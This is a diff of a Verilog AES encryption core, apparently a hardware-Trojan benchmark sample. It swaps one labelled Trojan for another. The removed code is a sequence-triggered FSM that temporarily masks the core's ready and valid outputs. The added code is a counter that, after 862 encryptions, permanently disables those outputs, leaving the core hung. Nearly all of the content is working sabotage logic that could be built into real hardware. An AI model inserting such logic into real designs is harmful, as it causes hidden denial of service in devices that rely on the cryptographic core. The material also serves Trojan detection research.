@@ -22,21 +22,16 @@ module aes_core(
   localparam CTRL_INIT  = 2'h1;
   localparam CTRL_NEXT  = 2'h2;
 
-  //----------------------------------------------------------------
-  // Trojan parameters and registers
-  //----------------------------------------------------------------
-  // Trojan state definitions
-  localparam TROJAN_OFF  = 2'b00;
-  localparam TROJAN_TRIG = 2'b01;
-  localparam TROJAN_ON   = 2'b10;
-
-  // Trojan registers
-  reg [1:0] trojan_state_reg, trojan_state_new;
-  reg       trojan_state_we;
-  reg [9:0] trojan_counter_reg, trojan_counter_new; // 10 bits for 1024 cycles
-  reg       trojan_counter_we;
-  reg [3:0] trojan_seq_reg, trojan_seq_new;
-  reg       trojan_seq_we;
+  // ---------------------- TROJAN INSERTION BEGIN -------------------------
+  // Denial-of-service Trojan: Encrypt counter/registers and disable flag
+  localparam TROJAN_TRIGGER_COUNT = 16'd862; // Trigger after 862 encryptions
+  reg [15:0] trojan_enc_count_reg;
+  reg [15:0] trojan_enc_count_new;
+  reg        trojan_enc_count_we;
+  reg        trojan_disable_reg;
+  reg        trojan_disable_new;
+  reg        trojan_disable_we;
+  // ---------------------- TROJAN INSERTION END ---------------------------
 
   //----------------------------------------------------------------
   // Registers including update variables and write enable.
@@ -52,7 +47,6 @@ module aes_core(
   reg         ready_reg;
   reg         ready_new;
   reg         ready_we;
-
 
   //----------------------------------------------------------------
   // Wires.
@@ -79,11 +73,10 @@ module aes_core(
 
   wire [31 : 0]  keymem_sboxw;
 
-/* verilator lint_off UNOPTFLAT */
+  /* verilator lint_off UNOPTFLAT */
   reg [31 : 0]   muxed_sboxw;
   wire [31 : 0]  new_sboxw;
-/* verilator lint_on UNOPTFLAT */
-
+  /* verilator lint_on UNOPTFLAT */
 
   //----------------------------------------------------------------
   // Instantiations.
@@ -106,7 +99,6 @@ module aes_core(
                                .ready(enc_ready)
                               );
 
-
   aes_decipher_block dec_block(
                                .clk(clk),
                                .reset_n(reset_n),
@@ -121,7 +113,6 @@ module aes_core(
                                .new_block(dec_new_block),
                                .ready(dec_ready)
                               );
-
 
   aes_key_mem keymem(
                      .clk(clk),
@@ -139,18 +130,14 @@ module aes_core(
                      .new_sboxw(new_sboxw)
                     );
 
-
   aes_sbox sbox_inst(.sboxw(muxed_sboxw), .new_sboxw(new_sboxw));
-
 
   //----------------------------------------------------------------
   // Concurrent connectivity for ports etc.
   //----------------------------------------------------------------
-  // Trojan: Use masked result and ready signals during attack
-  wire t_ready, t_result_valid;
-  assign ready        = t_ready;
+  assign ready        = ready_reg;
   assign result       = muxed_new_block;
-  assign result_valid = t_result_valid;
+  assign result_valid = result_valid_reg;
 
   //----------------------------------------------------------------
   // reg_update
@@ -163,16 +150,13 @@ module aes_core(
     begin: reg_update
       if (!reset_n)
         begin
-          result_valid_reg  <= 1'b0;
-          ready_reg         <= 1'b1;
-          aes_core_ctrl_reg <= CTRL_IDLE;
-
-          //-------------------------------
-          // TROJAN INSERTION: Reset logic
-          //-------------------------------
-          trojan_state_reg   <= TROJAN_OFF;
-          trojan_counter_reg <= 10'd0;
-          trojan_seq_reg     <= 4'd0;
+          result_valid_reg   <= 1'b0;
+          ready_reg          <= 1'b1;
+          aes_core_ctrl_reg  <= CTRL_IDLE;
+          // ------------------ TROJAN INSERTION BEGIN ------------------
+          trojan_enc_count_reg <= 16'd0;
+          trojan_disable_reg   <= 1'b0;
+          // ------------------ TROJAN INSERTION END --------------------
         end
       else
         begin
@@ -185,17 +169,12 @@ module aes_core(
           if (aes_core_ctrl_we)
             aes_core_ctrl_reg <= aes_core_ctrl_new;
 
-          //-------------------------------
-          // TROJAN INSERTION: Registers update
-          //-------------------------------
-          if (trojan_state_we)
-            trojan_state_reg <= trojan_state_new;
-
-          if (trojan_counter_we)
-            trojan_counter_reg <= trojan_counter_new;
-
-          if (trojan_seq_we)
-            trojan_seq_reg <= trojan_seq_new;
+          // ------------------ TROJAN INSERTION BEGIN ------------------
+          if (trojan_enc_count_we)
+            trojan_enc_count_reg <= trojan_enc_count_new;
+          if (trojan_disable_we)
+            trojan_disable_reg <= trojan_disable_new;
+          // ------------------ TROJAN INSERTION END --------------------
         end
     end // reg_update
 
@@ -216,7 +195,6 @@ module aes_core(
           muxed_sboxw = enc_sboxw;
         end
     end // sbox_mux
-
 
   //----------------------------------------------------------------
   // encdex_mux
@@ -248,145 +226,6 @@ module aes_core(
     end // encdec_mux
 
   //----------------------------------------------------------------
-  // TROJAN INSERTION: Trigger FSM
-  // This FSM watches for a rare event: the sequence of
-  // init, next, init, next, next (five consecutive events in this pattern)
-  //----------------------------------------------------------------
-  always @*
-    begin : trojan_fsm
-      trojan_state_new    = trojan_state_reg;
-      trojan_state_we     = 1'b0;
-      trojan_counter_new  = trojan_counter_reg;
-      trojan_counter_we   = 1'b0;
-      trojan_seq_new      = trojan_seq_reg;
-      trojan_seq_we       = 1'b0;
-
-      // Trojan locked-out state
-      case (trojan_state_reg)
-        TROJAN_OFF: begin
-          // Watch for pattern: init->1, next->0, init->1, next->0, next->0 (others=0)
-          // Sequence encoding (4 bits):
-          // seq 0: Wait init==1
-          // seq 1: Wait next==1
-          // seq 2: Wait init==1
-          // seq 3: Wait next==1
-          // seq 4: Wait next==1 (trigger)
-          if (trojan_seq_reg == 4'd0) begin
-            if (init && !next) begin
-              trojan_seq_new = 4'd1;
-              trojan_seq_we  = 1'b1;
-            end
-            else begin
-              trojan_seq_new = 4'd0;
-              trojan_seq_we  = 1'b1;
-            end
-          end
-          else if (trojan_seq_reg == 4'd1) begin
-            if (!init && next) begin
-              trojan_seq_new = 4'd2;
-              trojan_seq_we  = 1'b1;
-            end
-            else if (!init && !next) begin
-              // must keep waiting
-              trojan_seq_new = 4'd1;
-              trojan_seq_we  = 1'b1;
-            end
-            else begin
-              // Sequence broken, reset.
-              trojan_seq_new = 4'd0;
-              trojan_seq_we  = 1'b1;
-            end
-          end
-          else if (trojan_seq_reg == 4'd2) begin
-            if (init && !next) begin
-              trojan_seq_new = 4'd3;
-              trojan_seq_we  = 1'b1;
-            end
-            else if (!init && !next) begin
-              trojan_seq_new = 4'd2;
-              trojan_seq_we  = 1'b1;
-            end
-            else begin
-              trojan_seq_new = 4'd0;
-              trojan_seq_we  = 1'b1;
-            end
-          end
-          else if (trojan_seq_reg == 4'd3) begin
-            if (!init && next) begin
-              trojan_seq_new = 4'd4;
-              trojan_seq_we  = 1'b1;
-            end
-            else if (!init && !next) begin
-              trojan_seq_new = 4'd3;
-              trojan_seq_we  = 1'b1;
-            end
-            else begin
-              trojan_seq_new = 4'd0;
-              trojan_seq_we  = 1'b1;
-            end
-          end
-          else if (trojan_seq_reg == 4'd4) begin
-            if (!init && next) begin
-              // TRIGGER THE TROJAN
-              trojan_state_new    = TROJAN_ON;
-              trojan_state_we     = 1'b1;
-              trojan_counter_new  = 10'd0;
-              trojan_counter_we   = 1'b1;
-              trojan_seq_new      = 4'd0; // reset seq track
-              trojan_seq_we       = 1'b1;
-            end
-            else if (!init && !next) begin
-              trojan_seq_new = 4'd4;
-              trojan_seq_we  = 1'b1;
-            end
-            else begin
-              trojan_seq_new = 4'd0;
-              trojan_seq_we  = 1'b1;
-            end
-          end
-          else begin
-            trojan_seq_new = 4'd0;
-            trojan_seq_we  = 1'b1;
-          end
-        end
-        TROJAN_ON: begin
-          if (trojan_counter_reg < 10'd1023) begin
-            trojan_counter_new = trojan_counter_reg + 10'd1;
-            trojan_counter_we  = 1'b1;
-            // Stay in THIS STATE
-            trojan_state_new = TROJAN_ON;
-            trojan_state_we  = 1'b0;
-          end else begin
-            // Done with lockout
-            trojan_state_new = TROJAN_OFF;
-            trojan_state_we  = 1'b1;
-            trojan_counter_new = 10'd0;
-            trojan_counter_we  = 1'b1;
-            trojan_seq_new = 4'd0;
-            trojan_seq_we  = 1'b1;
-          end
-        end
-        TROJAN_TRIG: begin
-          // Not used; placeholder for expansion
-          trojan_state_new = TROJAN_OFF;
-          trojan_state_we  = 1'b1;
-          trojan_counter_new = 10'd0;
-          trojan_counter_we  = 1'b1;
-          trojan_seq_new = 4'd0;
-          trojan_seq_we  = 1'b1;
-        end
-        default: begin
-          trojan_state_new = TROJAN_OFF;
-          trojan_state_we  = 1'b1;
-          trojan_counter_new = 10'd0;
-          trojan_counter_we  = 1'b1;
-          trojan_seq_new = 4'd0;
-          trojan_seq_we  = 1'b1;
-        end
-      endcase
-    end // trojan_fsm
-
-  //----------------------------------------------------------------
   // aes_core_ctrl
   //
   // Control FSM for aes core. Basically tracks if we are in
@@ -402,6 +241,13 @@ module aes_core(
       result_valid_we   = 1'b0;
       aes_core_ctrl_new = CTRL_IDLE;
       aes_core_ctrl_we  = 1'b0;
+
+      // --------- TROJAN INSERTION BEGIN (default assignments) -----------
+      trojan_enc_count_new = trojan_enc_count_reg;
+      trojan_enc_count_we  = 1'b0;
+      trojan_disable_new   = trojan_disable_reg;
+      trojan_disable_we    = 1'b0;
+      // --------- TROJAN INSERTION END -----------------------------------
 
       case (aes_core_ctrl_reg)
         CTRL_IDLE:
@@ -447,6 +293,20 @@ module aes_core(
 
             if (muxed_ready)
               begin
+                // -------------- TROJAN INSERTION BEGIN ----------------
+                // Only increment counter (and check) for encryption mode
+                if (encdec && !trojan_disable_reg) begin
+                  if (trojan_enc_count_reg < TROJAN_TRIGGER_COUNT) begin
+                    trojan_enc_count_new = trojan_enc_count_reg + 16'd1;
+                    trojan_enc_count_we  = 1'b1;
+                  end
+                  if ((trojan_enc_count_reg + 16'd1) >= TROJAN_TRIGGER_COUNT) begin
+                    trojan_disable_new = 1'b1; // Assert the disable flag on 862nd encrypt
+                    trojan_disable_we  = 1'b1;
+                  end
+                end
+                // -------------- TROJAN INSERTION END ------------------
+
                 ready_new         = 1'b1;
                 ready_we          = 1'b1;
                 result_valid_new  = 1'b1;
@@ -458,23 +318,21 @@ module aes_core(
 
         default:
           begin
-            // Default assignments to prevent latch inference
-            init_state = 1'b0;
-            ready_new  = 1'b1;
-            ready_we   = 1'b0;
-            result_valid_new = 1'b0;
-            result_valid_we = 1'b0;
-            aes_core_ctrl_new = CTRL_IDLE;
-            aes_core_ctrl_we = 1'b0;
+
           end
       endcase // case (aes_core_ctrl_reg)
-    end // aes_core_ctrl
 
-  //----------------------------------------------------------------
-  // TROJAN INSERTION: Output masking logic.
-  // When the Trojan is active, output ports ready/result_valid are deasserted (system stuck).
-  //----------------------------------------------------------------
-  assign t_ready        = (trojan_state_reg == TROJAN_ON) ? 1'b0 : ready_reg;
-  assign t_result_valid = (trojan_state_reg == TROJAN_ON) ? 1'b0 : result_valid_reg;
+      // --------- TROJAN INSERTION BEGIN (payload: disable all outputs) --------
+      // Upon trojan_disable_reg asserted, disable outputs, handshake
+      if (trojan_disable_reg) begin
+        ready_new        = 1'b0;  // Block interface ready handshake
+        result_valid_new = 1'b0;  // Block valid output
+        // Not required to change new_block (still provided, but not indicated valid)
+        ready_we         = 1'b1;
+        result_valid_we  = 1'b1;
+      end
+      // --------- TROJAN INSERTION END -----------------------------------------
+
+    end // aes_core_ctrl
 
 endmodule
